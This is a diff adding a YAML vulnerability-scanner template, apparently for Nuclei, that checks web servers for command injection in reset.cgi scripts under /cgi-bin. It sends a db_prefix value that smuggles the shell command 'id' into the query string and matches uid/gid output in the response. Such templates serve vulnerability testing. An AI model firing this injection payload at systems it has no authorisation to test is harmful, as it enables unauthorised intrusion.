@@ -1,0 +1,23 @@
+id : cgi-bin-rce
+
+info : 
+  name: Remote Code Execution - cgi-bin
+  author: omkar7505
+  severity: critical
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/dmt/reset.cgi?db_prefix=%26id%26"
+      - "{{BaseURL}}/cgi-bin/reset.cgi?db_prefix=%26id%26"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "uid=([0-9(a-z)]+) gid=([0-9(a-z)]+) groups=([0-9(a-z)]+)"
+      
+      - type: status
+        status: 
+          - 200
